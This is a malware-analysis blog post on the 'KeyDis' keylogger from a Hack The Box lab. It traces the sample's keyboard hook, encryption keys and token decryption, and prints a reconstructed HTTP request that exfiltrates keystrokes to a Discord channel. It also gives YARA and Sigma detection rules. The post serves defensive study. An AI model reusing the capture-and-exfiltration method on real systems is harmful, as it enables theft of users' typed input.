---
layout: post
title: "KeyDis: Anatomy of a Windows Keylogger"
description: "Following a Windows keylogger from hidden API calls and keyboard capture to encrypted Discord exfiltration, then turning the evidence into detection ideas."
date: 2026-10-27 08:00:00 +0100
category: "Malware analysis"
tags: [KeyDis, Reverse Engineering, Keylogging, Discord, Detection Engineering]
permalink: /articles/keydis/
thumbnail: /assets/images/keydis/keydis-cover.png
thumbnail_alt: "Discord emblem connected to a keyboard with a highlighted captured key"
---

*The Guarded Kernel · Malware analysis · Research reviewed: 27 October 2026*

An employee installs an application that appears legitimate. A console window flashes, then the SOC notices unusual outbound traffic. The recovered executable becomes the starting point for the investigation.

That is the scenario behind Hack The Box's **KeyDis** Sherlock. I approached the binary with three questions: **what does it collect, what triggers transmission, and where does the data go?** A familiar destination should receive the same scrutiny as an unfamiliar one.

**Scope:** static analysis of one recovered executable, supported by Ghidra screenshots and offline checks of its API hashes and token decryption. The sample was not executed. The download story comes from the scenario; successful delivery of stolen data was not independently observed.

## 1. The execution flow

<figure class="article-figure">
  <a href="{{ '/assets/images/keydis/01-execution-flow.png' | relative_url }}" target="_blank" rel="noopener" aria-label="Open Figure 1 at full size">
    <img src="{{ '/assets/images/keydis/01-execution-flow.png' | relative_url }}" alt="A flow diagram showing user execution, anti-VM checks, a Windows keyboard hook, Enter-triggered XTEA encryption, RC4 token decryption and HTTPS exfiltration to Discord." width="3200" height="2640" loading="lazy" decoding="async">
  </a>
  <figcaption>Figure 1 — KeyDis execution flow, reconstructed from the executable. XTEA protects captured text; RC4 conceals the embedded bot token. Delivery context comes from the Sherlock scenario. <span class="figure-enlarge">Click the image to view full size ↗</span></figcaption>
</figure>

KeyDis installs a keyboard hook, turns keystrokes into text and stores that text in memory. Pressing **Enter** triggers XTEA encryption. The resulting blocks are sent as Discord channel messages through WinHTTP.

The RC4 routine has a separate job: recovering the bot token used to authorize those requests. The Discord desktop client is unnecessary. The examined path establishes **exfiltration**, without establishing remote command control.

## 2. Follow the chain through the code

### Step 1 — Identify the executable

| Property | Finding |
|---|---|
| Sample | `keydis.exe` |
| Size | 34,304 bytes |
| Format | Windows PE32+, x86-64, console subsystem |
| Compiler indicators | Microsoft Visual C/C++; Rich header and debug-runtime dependencies |
| PE timestamp, UTC | `2026-04-05 22:21:15` |
| SHA-256 | `caf4e182e31631bba63fcc17c30b8ec23cdd77147f445b01e1681d1830fe932f` |

The console subsystem could account for the visible window. A separate `cmd.exe` child process has not been demonstrated. The PE timestamp is recorded metadata, not independent proof of the actual build time.

Addresses below use Ghidra's preferred image base, `0x140000000`. Account for relocation when examining a running process.

### Step 2 — Check the environment

The routine at `0x140002EDC` checks registry and hardware information for virtualization indicators. A positive result causes the main routine to return. Its later message loop repeats the environment check and checks the PEB's `BeingDebugged` flag through `0x1400012AC`.

<figure class="article-figure">
  <a href="{{ '/assets/images/keydis/02-environment-checks.png' | relative_url }}" target="_blank" rel="noopener" aria-label="Open Figure 2 at full size">
    <img src="{{ '/assets/images/keydis/02-environment-checks.png' | relative_url }}" alt="Ghidra listing and string table showing VirtualBox and VMware strings with references to function 140002edc." width="2188" height="1138" loading="lazy" decoding="async">
  </a>
  <figcaption>Figure 2 — VirtualBox and VMware strings referenced by the environment-check routine. These are anti-analysis indicators; they do not establish persistence. <span class="figure-enlarge">Click the image to view full size ↗</span></figcaption>
</figure>

This explains why a sample can appear inactive inside an analysis VM. The useful evidence is the **check and its exit branch**, rather than the absence of visible behavior.

### Step 3 — Resolve APIs through hashes

KeyDis decodes hex-encoded DLL names, finds loaded modules through the PEB and walks their exports. It hashes each exported name and compares the result with a stored value.

| Routine | Address | Role |
|---|---|---|
| Module lookup | `0x140001300` | Walks loaded-module structures. |
| Name hashing | `0x140001394` | Calculates the custom 32-bit API hash. |
| API resolver | `0x1400014B8` | Finds an export whose name produces the requested hash. |

Reproducing that calculation identifies the important calls:

| Stored hash | Matching API |
|---|---|
| `0xB79D4BCD` | `SetWindowsHookExA` |
| `0x28331FE9` | `GetKeyState` |
| `0x3FD69474` | `ToUnicodeEx` |

These API names are analyst-resolved identities. Ghidra can initially display the calls as generic function pointers. An import-table review alone would miss much of the behavior.

### Step 4 — Install the keyboard hook

The main routine at `0x140003374` resolves `SetWindowsHookExA` and calls it with hook type **13**, `WH_KEYBOARD_LL`. The callback is `0x140002820`. A Windows message loop keeps the hook active.

<figure class="article-figure">
  <a href="{{ '/assets/images/keydis/03-keyboard-hook.png' | relative_url }}" target="_blank" rel="noopener" aria-label="Open Figure 3 at full size">
    <img src="{{ '/assets/images/keydis/03-keyboard-hook.png' | relative_url }}" alt="Ghidra assembly and decompiler showing the hashed API lookup, keyboard-hook arguments and Windows message loop." width="2194" height="1274" loading="lazy" decoding="async">
  </a>
  <figcaption>Figure 3 — The resolver receives 0xB79D4BCD, followed by a hook call with type 0x0D and callback 0x140002820. Here 0x0D means hook type 13. <span class="figure-enlarge">Click the image to view full size ↗</span></figcaption>
</figure>

Microsoft documents this hook type as monitoring low-level keyboard input. Its presence alone is not a malware verdict; the collection and exfiltration code supplies the context.

Source: [Microsoft: SetWindowsHookExA][hook-api]

### Step 5 — Convert keystrokes into text

The callback processes `WM_KEYDOWN` (`0x100`) and `WM_SYSKEYDOWN` (`0x104`). It reads keyboard state, accounts for Shift, Alt and Caps Lock, and obtains the keyboard layout.

`ToUnicodeEx` translates the virtual key and scan code into UTF-16 characters. A later `WideCharToMultiByte` call converts the text to UTF-8 before appending it to the 1,024-byte global buffer.

For extended keys, the code **ORs the scan code with `0xE000`** at `0x140002B4D`. This differs from the Sherlock question's wording about XOR with a virtual-key code.

Source for character-conversion semantics: [Microsoft: ToUnicodeEx][unicode-api]

### Step 6 — Encrypt when Enter is pressed

At `0x140002D90`, the callback compares the virtual key with `0x0D`: **`VK_RETURN`, Enter**. This value has a different role from the hook-type argument seen earlier.

<figure class="article-figure">
  <a href="{{ '/assets/images/keydis/04-enter-and-xtea-key.png' | relative_url }}" target="_blank" rel="noopener" aria-label="Open Figure 4 at full size">
    <img src="{{ '/assets/images/keydis/04-enter-and-xtea-key.png' | relative_url }}" alt="Ghidra decompiler showing a virtual-key comparison with 0x0D, the captured-text buffer, 32 rounds and four hardcoded encryption key words." width="1878" height="1233" loading="lazy" decoding="async">
  </a>
  <figcaption>Figure 4 — The callback&#x27;s Enter condition, the 0x20 round count and the four XTEA key words. The same view also shows character conversion and buffer writes above the trigger. <span class="figure-enlarge">Click the image to view full size ↗</span></figcaption>
</figure>

The encryption wrapper at `0x140002384` splits the text into eight-byte blocks and zero-pads an incomplete final block. Each block enters the XTEA routine at `0x140002258` for **32 rounds**.

```text
XTEA key — four 32-bit words, in order:
0x798D038E  0x72319E4F  0xD00DDEE0  0xF001004E
```

<figure class="article-figure">
  <a href="{{ '/assets/images/keydis/05-xtea-rounds.png' | relative_url }}" target="_blank" rel="noopener" aria-label="Open Figure 5 at full size">
    <img src="{{ '/assets/images/keydis/05-xtea-rounds.png' | relative_url }}" alt="Ghidra decompiler showing the XTEA round function, its shift operations, key indexes and delta constant." width="2192" height="1444" loading="lazy" decoding="async">
  </a>
  <figcaption>Figure 5 — XTEA&#x27;s round calculation: shifts by 4 and 5, the 0x9E3779B9 delta and sum-dependent key selection. The combined structure supports the identification. <span class="figure-enlarge">Click the image to view full size ↗</span></figcaption>
</figure>

One implementation detail matters: the examined callback does not reset the global buffer length after sending. Later Enter events can therefore resend earlier captured content. This is a code-level observation, not a tested traffic pattern.

### Step 7 — Recover the bot token

The first send initializes the token through `0x14000120C`. Its decryption wrapper at `0x140001BF8` uses a 256-byte RC4 state and this embedded ASCII key:

```text
ADQI1G98G19FJ2IR31
```

<figure class="article-figure">
  <a href="{{ '/assets/images/keydis/06-rc4-token-routine.png' | relative_url }}" target="_blank" rel="noopener" aria-label="Open Figure 6 at full size">
    <img src="{{ '/assets/images/keydis/06-rc4-token-routine.png' | relative_url }}" alt="Ghidra decompiler showing the RC4 state swaps, modulo-256 indexes and XOR against input bytes." width="1903" height="1271" loading="lazy" decoding="async">
  </a>
  <figcaption>Figure 6 — The RC4 keystream routine at 0x140001AC8. It updates indexes, swaps state bytes and XORs the generated stream with the input. <span class="figure-enlarge">Click the image to view full size ↗</span></figcaption>
</figure>

Offline decryption of the 72-byte ciphertext produced a bot-token-shaped string; an independent RC4 implementation reproduced the result. The plaintext credential is redacted here, and its validity was not checked against Discord.

**XTEA encrypts captured text. RC4 decrypts the embedded credential.** HTTPS then protects the network connection. These are three separate layers.

### Step 8 — Send the blocks through Discord

The sender at `0x140001CFC` prepares JSON, creates a WinHTTP connection to `discord.com` on port **443**, and opens a `POST` request with `WINHTTP_FLAG_SECURE` (`0x00800000`).

<figure class="article-figure">
  <a href="{{ '/assets/images/keydis/07-discord-request.png' | relative_url }}" target="_blank" rel="noopener" aria-label="Open Figure 7 at full size">
    <img src="{{ '/assets/images/keydis/07-discord-request.png' | relative_url }}" alt="Ghidra assembly and decompiler showing the Discord API message path, port 443, HTTPS request construction and Authorization Bot header." width="2184" height="1266" loading="lazy" decoding="async">
  </a>
  <figcaption>Figure 7 — The channel-message path, JSON content, port 0x1BB (443), POST method, secure-request flag and bot-authorization header in the sender. <span class="figure-enlarge">Click the image to view full size ↗</span></figcaption>
</figure>

The reconstructed request has this shape:

```http
POST /api/v10/channels/<channel_id>/messages HTTP/1.1
Host: discord.com
Authorization: Bot <redacted>
Content-Type: application/json

{"content":"YEb NAts <block>: v0=0x<word0>, v1=0x<word1>\n"}
```

Each encrypted block becomes a separate message containing two hexadecimal words. The code uses the **bot-authenticated channel-message API**. This path is distinct from Discord's webhook endpoint.

Sources: [Discord: authentication][discord-auth] · [Discord: messages][discord-messages] · [Microsoft: WinHttpOpenRequest][winhttp-api]

## 3. Artifacts worth keeping

### Static and memory leads

| Artifact | Investigative value | Limit |
|---|---|---|
| Sample SHA-256 | Identifies the exact recovered file. | Rebuilding or modifying the file changes it. |
| Channel ID `1437748321317027892` | A configuration pivot for this sample. | No ownership or live activity was established. |
| `/api/v10/channels/%s/messages` | Identifies the request-path template. | Legitimate bots use the same API. |
| `Authorization: Bot %s` | Shows bot-token authorization. | The template alone is not malicious. |
| `Discord/1.0` | Hardcoded WinHTTP user-agent value. | A chosen label does not identify the real process. |
| RC4 key and XTEA key words | Useful sample-comparison leads. | They can change between builds. |
| Global buffer `0x140009CA0` | Captured text before encryption. | Requires a suitable process-memory acquisition. |
| Token pointer `0x140009C50` | Decrypted credential after initialization. | It need not exist before the first send. |

### What to collect from an affected host

| Question | Useful evidence | Practical limit |
|---|---|---|
| What executed the file? | Sysmon **1** or EDR process events: image, hash, parent and command line. | Correlate with the actual execution window. |
| Which process contacted Discord? | Sysmon **22** DNS queries and **3** network events; EDR network telemetry. | Network events must be collected; an IP connection does not reveal the HTTP body. |
| What was sent? | Authorized TLS inspection, application-layer telemetry or memory. | Ordinary encrypted traffic capture hides the URI path, headers and content. |
| Were keyboard APIs used? | Suitable EDR/API instrumentation or memory analysis. | Standard Sysmon events do not directly record `SetWindowsHookExA` calls. |
| Were VM indicators queried? | Registry-read telemetry from suitable instrumentation. | Sysmon registry events **12–14** describe changes, not this read-only check. |

Join process, DNS and connection records using **`ProcessGuid`** where available. For delivery context, also preserve browser download history and any surviving `Zone.Identifier` stream. Those host artifacts were not supplied in this Sherlock.

Source for Sysmon event semantics: [Microsoft: Sysmon][sysmon]

## 4. Turn the findings into detections

### YARA — identify this sample's string cluster

This rule combines the API template, authorization template, RC4 key and distinctive block-format string. It is deliberately specific to the examined build.

```yara
import "pe"

rule TGK_KeyDis_Discord_String_Cluster
{
    meta:
        author = "The Guarded Kernel"
        description = "Static triage for the examined HTB KeyDis build"
        date = "2026-10-27"
        sample_sha256 = "caf4e182e31631bba63fcc17c30b8ec23cdd77147f445b01e1681d1830fe932f"
        reference = "https://theguardedkernel.be/articles/keydis/"
    strings:
        $s_endpoint = "/api/v10/channels/%s/messages" ascii
        $s_auth = "Authorization: Bot %s" ascii
        $s_key = "ADQI1G98G19FJ2IR31" ascii
        $s_block = "YEb NAts %zu: v0=0x%08x, v1=0x%08x" ascii
    condition:
        pe.is_pe and filesize < 200KB and all of ($s_*)
}
```

**Validation:** compiled with YARA-X 1.22.1 and matched against the supplied executable. **Limit:** no representative benign PE corpus was available; changed strings or packing can evade it. A match is a sample-triage result, not actor attribution.

### Sigma — hunt for an unusual process reaching Discord

This rule flags Discord DNS queries originating from executables in Downloads or a user's temporary directory. It provides a lead to correlate with process provenance and outbound connections.

```yaml
title: Discord DNS Query From a Download or Temporary Directory
id: ee127a91-0496-4f30-94e6-8779c5da2633
status: experimental
description: >-
    Flags process-origin Discord DNS queries from a Downloads or user temporary
    directory for investigation. Does not establish keylogging or exfiltration.
author: The Guarded Kernel
date: 2026-10-27
references:
    - https://theguardedkernel.be/articles/keydis/
    - https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
tags:
    - attack.exfiltration
    - attack.t1567
logsource:
    category: dns_query
    product: windows
detection:
    selection_domain:
        QueryName:
            - 'discord.com'
            - 'discord.com.'
    selection_location:
        Image|contains:
            - '\Downloads\'
            - '\AppData\Local\Temp\'
    condition: selection_domain and selection_location
falsepositives:
    - Portable chat clients and legitimate bots
    - Installers and developer utilities launched from these directories
level: low
```

**Needs:** process-origin DNS events, such as Sysmon **22**, mapped to `Image` and `QueryName`. **False positives:** portable clients, installers, developer tools and legitimate bots. **Limit:** the selection does not prove keylogging or data transmission, and execution from another directory evades it.

**Validation:** parsed with pySigma and converted to Splunk SPL using the Sysmon and Splunk Windows pipelines. The result selects Sysmon Event 22. No SIEM execution or production tuning was performed.

Download the [YARA rule]({{ '/assets/downloads/keydis/keydis-string-cluster.yar' | relative_url }}), [Sigma rule]({{ '/assets/downloads/keydis/discord-dns-user-directory.yml' | relative_url }}), and [converted SPL]({{ '/assets/downloads/keydis/discord-dns-user-directory.spl' | relative_url }}). Read the [validation notes]({{ '/assets/downloads/keydis/README.md' | relative_url }}) before adapting them.

Sources: [YARA syntax][yara] · [Sigma rule format][sigma] · [Microsoft: Sysmon][sysmon]

### Selected ATT&CK mapping

| Observed behavior | Technique |
|---|---|
| VM registry and hardware checks | [T1497.001 — System Checks](https://attack.mitre.org/techniques/T1497/001/) |
| PEB debugger-flag check | [T1622 — Debugger Evasion](https://attack.mitre.org/techniques/T1622/) |
| API names resolved through hashes | [T1027.007 — Dynamic API Resolution](https://attack.mitre.org/techniques/T1027/007/) |
| Keyboard-hook collection | [T1056.001 — Keylogging](https://attack.mitre.org/techniques/T1056/001/) |
| Embedded token decrypted before use | [T1140 — Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140/) |
| Captured data sent through Discord | [T1567 — Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567/) |

These are analyst mappings of this sample's code. The bot-message path does not justify the more specific **Exfiltration Over Webhook** mapping.

## 5. Where this connects to real attacks

| Published research | Reported behavior | Connection to this analysis |
|---|---|---|
| **Sophos, 22 July 2021** — [Discord abuse][sophos-discord] | Malware used Discord bot APIs and HTTPS requests to send stolen information to channels. | Direct context for treating a legitimate messaging service as an exfiltration destination. |
| **Unit 42, 6 June 2025** — [Blitz][blitz] | Backdoored game cheats delivered malware; Hugging Face Spaces supported delivery and C2. | Familiar software and legitimate hosting do not establish trust in the process using them. |
| **Kaspersky, 1 April 2026** — [CrystalX][crystalx] | A commercial RAT offered keylogging and anti-analysis features; its keylogger transmitted input over WebSocket. | A recent example of the same collection objective with a different transport and broader capabilities. |

These are separate investigations. Shared behavior does not establish common code, a shared operator or KeyDis activity outside the lab. The defensive connection is to examine **the originating process and the data flow**, alongside the destination.

## 6. Conclusion

KeyDis has a compact purpose: capture keyboard input and send encrypted blocks to Discord. API hashing complicates the first inspection, while environment checks can interrupt execution in a lab.

The useful outcome is a chain supported by addresses, calls and data: **hook → text buffer → Enter trigger → XTEA → authorized HTTPS request**. That chain also identifies the evidence a SOC needs to connect an unfamiliar executable to otherwise ordinary-looking Discord traffic.

## Sources

- **Primary evidence:** `keydis.exe` from HTB's KeyDis Sherlock, identified by the SHA-256 above; accompanying Ghidra screenshots from this investigation. Function names used in the prose are analyst labels.
- [Microsoft — SetWindowsHookExA][hook-api]. Hook type and callback semantics.
- [Microsoft — ToUnicodeEx][unicode-api]. Keyboard-state and character-conversion semantics.
- [Microsoft — WinHttpOpenRequest][winhttp-api]. Secure-request flag.
- [Discord — API authentication][discord-auth] and [message resource][discord-messages]. Bot headers and channel-message behavior.
- [Microsoft — Sysmon][sysmon]. Event types and collection limits.
- [YARA — Writing rules][yara] and [SigmaHQ — Rules][sigma]. Detection syntax.
- [Sophos — Malware increasingly targets Discord for abuse][sophos-discord], 22 July 2021.
- [Unit 42 — Blitz Malware: A Tale of Game Cheats and Code Repositories][blitz], 6 June 2025.
- [Kaspersky — A laughing RAT: CrystalX combines spyware, stealer, and prankware features][crystalx], 1 April 2026.
- **MITRE ATT&CK:** individual technique references appear in the mapping table.

[hook-api]: https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa
[unicode-api]: https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-tounicodeex
[winhttp-api]: https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopenrequest
[discord-auth]: https://docs.discord.com/developers/reference#authentication
[discord-messages]: https://docs.discord.com/developers/resources/message#create-message
[sysmon]: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
[yara]: https://yara.readthedocs.io/en/stable/writingrules.html
[sigma]: https://sigmahq.io/docs/basics/rules.html
[sophos-discord]: https://www.sophos.com/en-us/blog/malware-increasingly-targets-discord-for-abuse
[blitz]: https://unit42.paloaltonetworks.com/blitz-malware-2025/
[crystalx]: https://securelist.com/crystalx-rat-with-prankware-features/119283/
